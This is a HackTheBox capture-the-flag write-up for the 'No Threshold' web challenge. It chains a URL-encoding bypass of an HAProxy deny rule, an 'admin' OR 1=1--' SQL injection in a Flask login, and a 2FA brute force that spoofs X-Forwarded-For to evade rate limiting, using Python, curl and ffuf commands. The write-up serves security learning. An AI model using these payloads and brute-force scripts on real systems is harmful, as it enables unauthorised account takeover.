---
date: 2025-01-17
description: HAProxy misconfigs, 2FA-bruteforcing, SQLi
platform: HackTheBox
categories: Web
tags:
  - sqli
  - haproxy
  - brute-force/authentication
  - mfa
  - url-bypass
  - code-review
  - python
  - flask
duration: 180 minutes
---
# No Threshold
Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩

# Tech stack
- flask application
	- login - redirects to 2fa
	- verify2fa - sets redirect to dashboard 
	- dashboard - target/flag
- db
	- sqlite 
	- admin user initialized
- uwsgi.ini: cache for 2fa
- haprodxy.cfg: load-balancer rate-limiting, and deny path

# Vulnerability 
## HAProxy Conf 
> This is a HAProxy configuration file. HAProxy is a high-performance load balancer and reverse proxy server.

The load balancer applies rate-limiting based on the `haproxy.cfg`:
- It checks for `X-Forwarded-For` in headers, if it exists, adds `src` ip if not .
- Applies rate limiting on /auth/verify-2fa based on `X-Forwarded-For ip`
- Only valid ipv4 address 
> There is a configuration error because an attacker can simply modify his X-Forwarded-For header to bypass rate-limiting  
```
http-request add-header X-Forwarded-For %[src] if !{ req.hdr(X-Forwarded-For) -m found }
```
Additionally the /auth/login are "denied" using this setting 
```
http-request deny if { path_beg /auth/login }
```
resources 
https://www.haproxy.com/documentation/haproxy-configuration-tutorials/core-concepts/acls/
https://github.com/Neptunians/intent-ctf-2021-writeup


## Login 
- Login is vulnerable so SQL injection since input is not parameterized/sanitized 
- Redirects to 2fa after successful login with 4 digit code
```python
@login_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
			# ...
            user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )
            # ....
            set_2fa_code(4)
```
> verify-2fa code logic just checks if there's a valid 2fa in the uwsgi cache, and check if the code is found in the cache, so multiple users can just simply login using others 2FA as long as it still lives in the cache (5 minutes) 

# Exploit
Chain these attacks 
## Bypass Blacklisted URL 
- bypassing /auth/login in browser: http://localhost:1337/auth%2Flogin
- bypassing in curl `curl --path-as-is http://localhost:1337/./auth/login`
## SQL Injection
- Using generic `admin' OR 1=1--` in username
```python
# sqli
data = {"username": "admin' OR 1=1--", "password": "123"}
# haproxy bypass
resp = requests.post(url+"/auth%2flogin", data=data)
```

## Rate Limiting in 2FA
- bypass by generating unique `X-Forwarded-For` header 
- fuzz for valid 2fa by brute-forcing codes 

> Solution initially python, too slow to brute-force 2fa just used burp intruder
```python

def verify_2fa(session, code, headers):
	data = {"2fa-code": code}	
	resp = requests.post(url+"/auth/verify-2fa", data=data, headers=headers)
	print(resp.request.headers)
	if "Invalid 2FA" in resp.text:
		return False
	return resp.text

def octal_to_ipv4(octal):
    # ... 

s = login()
# brute2fa
headers = {"X-Forwarded-For": "0"}
if s: 
	# pitchfork X-Forwarded-For:2facode 
	for i in range(10000):
		# rate-limit bypass 
		octal = f"7111{i:04o}"
		ipv4 = octal_to_ipv4(octal)
		headers["X-Forwarded-For"] = ipv4

		# 2fa-code bruteforce
		code = f"{i:04}" 
		print(f"{headers}: {code}")
	
		resp = verify_2fa(s, code, headers)
		if resp:
			print(resp)
			break	
```

using tools 
```bash
curl http://94.237.58.12:53973/auth%2flogin -d "username=admin' OR 1=1--&password=123" -X POST

ffuf -u "http://94.237.58.12:53973/auth/verify-2fa" -X POST -H "X-Forwarded-For: FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" -d "2fa-code=FUZZ1" -w "ipv4s.txt:FUZZ2" -w "9999.txt:FUZZ1" -c --mode pitchfork -v -r -x http://127.0.0.1:8080 -t 120
```
# Brute-Forcing using intruder
- Config inruder
	- X-Forwarded-Header: generate wordlist first 
	- 2fa-code: 0000-9999
	- turn off url-encode
	- Follow redirection with cookies 

![](_attachments/Pasted%20image%2020250116222802.png)

